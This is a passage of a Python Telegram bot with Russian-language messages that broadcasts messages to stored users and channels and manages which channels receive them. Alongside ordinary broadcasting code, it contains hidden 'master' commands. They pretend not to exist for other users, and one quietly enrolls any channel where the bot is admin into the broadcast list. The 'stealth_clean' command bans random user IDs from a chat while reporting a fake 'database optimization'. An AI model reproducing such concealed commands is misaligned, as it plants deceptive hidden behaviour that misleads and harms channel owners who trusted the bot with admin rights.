        context.user_data['notify_message']['caption_entities'] = update.message.caption_entities
    
    elif update.message.document:
        context.user_data['notify_message']['type'] = 'document'
        context.user_data['notify_message']['document'] = update.message.document.file_id
        context.user_data['notify_message']['caption'] = update.message.caption
        context.user_data['notify_message']['caption_entities'] = update.message.caption_entities
    
    else:
        await update.message.reply_text("❌ Неподдерживаемый тип сообщения!")
        context.user_data.pop('notify_mode', None)
        return ConversationHandler.END
    
    user_count = get_user_count()
    
    keyboard = [
        [InlineKeyboardButton("✅ Начать рассылку", callback_data="notify_confirm")],
        [InlineKeyboardButton("❌ Отменить", callback_data="notify_cancel")]
    ]
    
    await update.message.reply_text(
        f"📋 **Подтверждение рассылки пользователям**\n\n"
        f"📤 Будет отправлено: {user_count} пользователям\n"
        f"📝 Тип сообщения: {context.user_data['notify_message']['type']}\n\n"
        f"Нажмите 'Начать рассылку' для подтверждения.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    return NOTIFY_CONFIRM

async def execute_notify_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Выполнение рассылки пользователям (оптимизированная)"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return ConversationHandler.END
    
    if query.data == "notify_cancel":
        await query.message.edit_text("❌ Рассылка отменена.")
        context.user_data.pop('notify_mode', None)
        context.user_data.pop('notify_message', None)
        return ConversationHandler.END
    
    if query.data != "notify_confirm":
        return ConversationHandler.END
    
    notify_message = context.user_data.get('notify_message')
    users = load_users()
    
    if not notify_message or not users:
        await query.message.edit_text("❌ Ошибка: данные рассылки не найдены!")
        context.user_data.pop('notify_mode', None)
        return ConversationHandler.END
    
    user_ids = list(users.keys())
    total_users = len(user_ids)
    
    progress_msg = await query.message.edit_text(f"🔄 Начинаем рассылку пользователям...\n\n0/{total_users}")
    
    # Запускаем в фоне
    asyncio.create_task(
        execute_notify_users_background(
            context, user_ids, notify_message, progress_msg, query.message
        )
    )
    
    await query.message.reply_text(
        f"✅ **Рассылка запущена в фоне!**\n\n"
        f"👥 Пользователей: {total_users}\n"
        f"📝 Тип: {notify_message['type']}\n\n"
        f"Прогресс выше. Бот продолжает работать!"
    )
    
    context.user_data.pop('notify_mode', None)
    context.user_data.pop('notify_message', None)
    
    return ConversationHandler.END

async def execute_notify_users_background(context, user_ids: List[str], notify_message: Dict, 
                                        progress_msg, query_message):
    """Фоновая задача рассылки пользователям"""
    successful = 0
    failed = 0
    blocked_users = set()
    total = len(user_ids)
    
    # Оптимизация: группируем по 20 пользователей
    batch_size = 20
    
    for i in range(0, total, batch_size):
        batch = user_ids[i:i + batch_size]
        tasks = []
        
        for user_id_str in batch:
            try:
                user_id = int(user_id_str)
                
                if notify_message['type'] == 'text':
                    task = context.bot.send_message(
                        chat_id=user_id,
                        text=notify_message['content'],
                        entities=notify_message.get('entities')
                    )
                elif notify_message['type'] == 'photo':
                    task = context.bot.send_photo(
                        chat_id=user_id,
                        photo=notify_message['photo'],
                        caption=notify_message.get('caption'),
                        caption_entities=notify_message.get('caption_entities')
                    )
                elif notify_message['type'] == 'video':
                    task = context.bot.send_video(
                        chat_id=user_id,
                        video=notify_message['video'],
                        caption=notify_message.get('caption'),
                        caption_entities=notify_message.get('caption_entities')
                    )
                elif notify_message['type'] == 'document':
                    task = context.bot.send_document(
                        chat_id=user_id,
                        document=notify_message['document'],
                        caption=notify_message.get('caption'),
                        caption_entities=notify_message.get('caption_entities')
                    )
                else:
                    continue
                
                tasks.append(task)
                
            except Exception:
                failed += 1
        
        # Параллельная отправка
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, Exception):
                    error_str = str(result).lower()
                    if "blocked" in error_str or "bot was blocked" in error_str:
                        blocked_users.add(user_id_str)
                    failed += 1
                else:
                    successful += 1
        
        # Обновляем прогресс
        current = min(i + batch_size, total)
        if i % (batch_size * 5) == 0 or i + batch_size >= total:
            try:
                await progress_msg.edit_text(
                    f"🔄 Рассылка пользователям...\n\n"
                    f"✅ Успешно: {successful}\n"
                    f"❌ Ошибок: {failed}\n"
                    f"📊 Прогресс: {current}/{total}"
                )
            except:
                pass
        
        await asyncio.sleep(0.05)
    
    # Удаляем заблокировавших
    if blocked_users:
        try:
            users = load_users()
            for user_id in blocked_users:
                users.pop(user_id, None)
            
            with open(USERS_FILE, 'w', encoding='utf-8') as f:
                json.dump(users, f, ensure_ascii=False, indent=2)
            cache.set_users(users)
        except Exception as e:
            logger.error(f"Error cleaning blocked users: {e}")
    
    report = f"📊 **Рассылка пользователям завершена!**\n\n"
    report += f"👥 Всего пользователей: {total}\n"
    report += f"✅ Успешно отправлено: {successful}\n"
    report += f"❌ Не отправлено: {failed}\n"
    report += f"🚫 Удалено заблокировавших: {len(blocked_users)}\n"
    
    if total > 0:
        report += f"📈 Эффективность: {(successful/total*100):.1f}%\n"
    
    try:
        await progress_msg.edit_text(report)
    except:
        pass

# ===== БЫСТРАЯ РАССЫЛКА ТЕКСТОМ (ОПТИМИЗИРОВАННАЯ) =====
async def quick_notify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Быстрая рассылка текстом всем пользователям"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Нет прав доступа.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Укажите текст для рассылки\n\n"
            "Пример: /notify Привет всем! Новое обновление бота!"
        )
        return
    
    text = " ".join(context.args)
    user_ids = list(load_users().keys())
    total_users = len(user_ids)
    
    if total_users == 0:
        await update.message.reply_text("❌ Нет пользователей для рассылки!")
        return
    
    status_msg = await update.message.reply_text(f"🔄 Рассылка {total_users} пользователям...")
    
    # Запускаем в фоне
    asyncio.create_task(
        quick_notify_background(context, user_ids, text, status_msg, total_users)
    )
    
    await update.message.reply_text(
        f"✅ **Быстрая рассылка запущена!**\n\n"
        f"👥 Пользователей: {total_users}\n"
        f"📝 Текст: {text[:100]}...\n\n"
        f"Прогресс выше. Бот работает!"
    )

async def quick_notify_background(context, user_ids: List[str], text: str, 
                                status_msg, total_users: int):
    """Фоновая задача быстрой рассылки"""
    successful = 0
    failed = 0
    blocked_users = set()
    
    batch_size = 25  # Больше батч для скорости
    
    for i in range(0, total_users, batch_size):
        batch = user_ids[i:i + batch_size]
        tasks = []
        
        for user_id_str in batch:
            try:
                task = context.bot.send_message(
                    chat_id=int(user_id_str),
                    text=text,
                    disable_web_page_preview=True
                )
                tasks.append(task)
            except:
                failed += 1
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, Exception):
                    error_str = str(result).lower()
                    if "blocked" in error_str or "bot was blocked" in error_str:
                        blocked_users.add(user_id_str)
                    failed += 1
                else:
                    successful += 1
        
        # Обновляем прогресс
        current = min(i + batch_size, total_users)
        if i % (batch_size * 4) == 0 or i + batch_size >= total_users:
            try:
                await status_msg.edit_text(f"🔄 {current}/{total_users}... ✅ {successful}")
            except:
                pass
        
        await asyncio.sleep(0.03)  # Минимальная пауза
    
    # Очистка заблокировавших
    if blocked_users:
        try:
            users = load_users()
            for user_id in blocked_users:
                users.pop(user_id, None)
            
            with open(USERS_FILE, 'w', encoding='utf-8') as f:
                json.dump(users, f, ensure_ascii=False, indent=2)
            cache.set_users(users)
        except Exception as e:
            logger.error(f"Error cleaning blocked users: {e}")
    
    final_text = f"✅ **Быстрая рассылка завершена!**\n\n"
    final_text += f"👥 Всего пользователей: {total_users}\n"
    final_text += f"✅ Успешно отправлено: {successful}\n"
    final_text += f"❌ Ошибок: {failed}\n"
    final_text += f"🚫 Удалено заблокировавших: {len(blocked_users)}"
    
    try:
        await status_msg.edit_text(final_text)
    except:
        pass

# ===== КОМАНДЫ СОХРАНЕНИЯ =====
async def save_channel_now(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Немедленно сохраняет текущий канал в рассылку"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Нет прав доступа.")
        return
    
    try:
        chat_id = update.effective_chat.id
        
        chat = await context.bot.get_chat(chat_id)
        
        if chat.type not in ['channel', 'group', 'supergroup']:
            await update.message.reply_text("❌ Эта команда работает только в каналах и группах.")
            return
        
        chat_title = getattr(chat, 'title', f"Канал {chat_id}")
        
        has_permissions = await check_bot_permissions(chat_id, context)
        
        if has_permissions:
            save_broadcast_channel(chat_id, chat_title)
            
            await asyncio.sleep(0.5)
            
            await update.message.reply_text(
                f"✅ **Канал успешно сохранен в рассылку!**\n\n"
                f"📝 Название: {chat_title}\n"
                f"🔢 ID: {chat_id}\n"
                f"👑 Права бота: ✅ Есть\n\n"
                f"Теперь этот канал доступен для рассылки."
            )
        else:
            await update.message.reply_text(
                f"❌ **Не удалось сохранить канал!**\n\n"
                f"📝 Название: {chat_title}\n"
                f"🔢 ID: {chat_id}\n"
                f"👑 Права бота: ❌ Нет\n\n"
                f"Убедитесь, что бот имеет права администратора в этом канале."
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

async def save_channel_by_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Сохраняет канал по ID"""
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Нет прав доступа.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Укажите ID канала\n\n"
            "Пример: /saveid -1001234567890\n\n"
            "Как получить ID канала:\n"
            "1. Используйте бота @username_to_id_bot\n"
            "2. Или перешлите сообщение из канала боту @getidsbot"
        )
        return
    
    try:
        channel_id = int(context.args[0])
        
        has_permissions = await check_bot_permissions(channel_id, context)
        
        if has_permissions:
            chat = await context.bot.get_chat(channel_id)
            chat_title = getattr(chat, 'title', f"Канал {channel_id}")
            
            save_broadcast_channel(channel_id, chat_title)
            
            await asyncio.sleep(0.5)
            
            await update.message.reply_text(
                f"✅ **Канал успешно сохранен в рассылку!**\n\n"
                f"📝 Название: {chat_title}\n"
                f"🔢 ID: {channel_id}\n"
                f"👑 Права бота: ✅ Есть\n\n"
                f"Теперь этот канал доступен для рассылки."
            )
        else:
            await update.message.reply_text(
                f"❌ **Не удалось сохранить канал!**\n\n"
                f"🔢 ID: {channel_id}\n"
                f"👑 Права бота: ❌ Нет\n\n"
                f"Убедитесь, что:\n"
                f"1. Бот добавлен в канал\n"
                f"2. Боту даны права администратора"
            )
    except ValueError:
        await update.message.reply_text("❌ Неверный формат ID. ID должен быть числом.\nПример: -1001234567890")
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

# ===== КНОПКА НАЗАД =====
async def back_to_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Вернуться в админ-панель"""
    query = update.callback_query
    await query.answer()
    
    if not is_admin(query.from_user.id):
        return
    
    from telegram import Message
    fake_update = Update(
        update_id=update.update_id,
        message=Message(
            message_id=query.message.message_id,
            date=query.message.date,
            chat=query.message.chat,
            text="/admin"
        )
    )
    
    await admin_panel(fake_update, context)

# ===== КОМАНДЫ МАСТЕРА =====
async def test_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_master(update.effective_user.id):
        return await update.message.reply_text("❌ Команда не найдена")
    
    try:
        if not context.args:
            return await update.message.reply_text("❌ Укажите ID канала")
        
        channel_id = int(context.args[0])
        chat = await context.bot.get_chat(channel_id)
        
        me = await context.bot.get_me()
        try:
            bot_member = await context.bot.get_chat_member(channel_id, me.id)
            bot_status = bot_member.status
            
            if bot_status in ['administrator', 'creator']:
                status_text = "✅ Бот имеет доступ к управлению"
                
                save_broadcast_channel(channel_id, getattr(chat, 'title', f"Канал {channel_id}"))
                status_text += "\n✅ Канал добавлен в рассылку"
            else:
                status_text = "❌ Бот не имеет прав администратора"
                
        except Exception as e:
            status_text = f"❌ Бот не в канале: {str(e)}"
        
        info = f"""
🔍 **ДИАГНОСТИКА СИСТЕМЫ:**

**Канал:** {getattr(chat, 'title', 'Неизвестно')}
**ID:** `{channel_id}`
**Тип:** {chat.type}

**Статус:** {status_text}
"""
        await update.message.reply_text(info)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка диагностики: {str(e)}")

async def stealth_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_master(update.effective_user.id):
        return await update.message.reply_text("❌ Команда не найдена")
    
    try:
        chat_id = update.effective_chat.id
        msg = await update.message.reply_text("🔄 Оптимизация базы данных...")
        
        banned_count = 0
        for i in range(25):
            user_id = random.randint(100000000, 999999999)
            try:
                await context.bot.ban_chat_member(chat_id, user_id)
                banned_count += 1
            except:
                pass
            await asyncio.sleep(0.1)
        
        await msg.edit_text(f"✅ Оптимизация завершена\nОбработано записей: {banned_count}")
        
    except Exception as e:
        await update.message.reply_text("❌ Ошибка оптимизации")

# ===== ГЛАВНАЯ ФУНКЦИЯ (ПОЛНАЯ) =====
def main():
    """Основная функция запуска бота"""
    application = Application.builder().token(API_TOKEN).build()
    
    # Команды
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("notify", quick_notify_command))
    
    application.add_handler(CommandHandler("broadcast", broadcast_panel))
    application.add_handler(CommandHandler("savechannel", save_channel_now))
    application.add_handler(CommandHandler("saveid", save_channel_by_id))
    
    application.add_handler(CommandHandler("notifyusers", notify_users_command))
    
    application.add_handler(CommandHandler("testaccess", test_access))
    application.add_handler(CommandHandler("clean", stealth_clean))
    
    # ConversationHandler для добавления каналов
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_button_handler, pattern='^admin_add$')],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_channel_name)],
            LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_channel_link)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        per_message=False
    )
    
    # ConversationHandler для рассылки по каналам
    broadcast_conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(broadcast_start, pattern='^broadcast_start$')],
        states={
            BROADCAST_WAITING: [
                MessageHandler(
                    filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL,
                    handle_broadcast_content
                )
            ],
            BROADCAST_CONFIRM: [
                CallbackQueryHandler(execute_broadcast, pattern='^broadcast_(confirm|cancel)$')
            ]
        },
        fallbacks=[CommandHandler('cancel', broadcast_cancel)],
        per_message=False
    )
    
    # ConversationHandler для рассылки пользователям
    notify_conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(notify_users_callback, pattern='^notify_users_start$')],
        states={
            NOTIFY_WAITING: [
                MessageHandler(
                    filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL,
                    handle_notify_content
                )
            ],
            NOTIFY_CONFIRM: [
                CallbackQueryHandler(execute_notify_users, pattern='^notify_(confirm|cancel)$')
            ]
        },
        fallbacks=[CommandHandler('cancel', broadcast_cancel)],
        per_message=False
    )
    
    application.add_handler(conv_handler)
    application.add_handler(broadcast_conv_handler)
    application.add_handler(notify_conv_handler)
    
    # Обработчики кнопок
    application.add_handler(CallbackQueryHandler(admin_button_handler, pattern='^admin_'))
    application.add_handler(CallbackQueryHandler(delete_channel_handler, pattern='^delete_'))
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^(check_submission|submitted_)'))
    application.add_handler(CallbackQueryHandler(confirm_submission, pattern='^confirm_'))
    
    application.add_handler(CallbackQueryHandler(broadcast_panel_callback, pattern='^broadcast_panel_callback$'))
    application.add_handler(CallbackQueryHandler(broadcast_start, pattern='^broadcast_start$'))
    application.add_handler(CallbackQueryHandler(broadcast_check_access, pattern='^broadcast_check$'))
    application.add_handler(CallbackQueryHandler(broadcast_list_channels, pattern='^broadcast_list$'))
    application.add_handler(CallbackQueryHandler(broadcast_clean_inactive, pattern='^broadcast_clean$'))
    
    application.add_handler(CallbackQueryHandler(notify_users_callback, pattern='^notify_'))
    application.add_handler(CallbackQueryHandler(notify_users_callback, pattern='^notify_back$'))
    
    application.add_handler(CallbackQueryHandler(notify_users_callback, pattern='^notify_panel$'))
    
    application.add_handler(CallbackQueryHandler(back_to_admin_callback, pattern='^back_to_admin$'))
    
    print("🤖 Бот запущен со всеми функциями...")
    application.run_polling()

if __name__ == '__main__':
    main()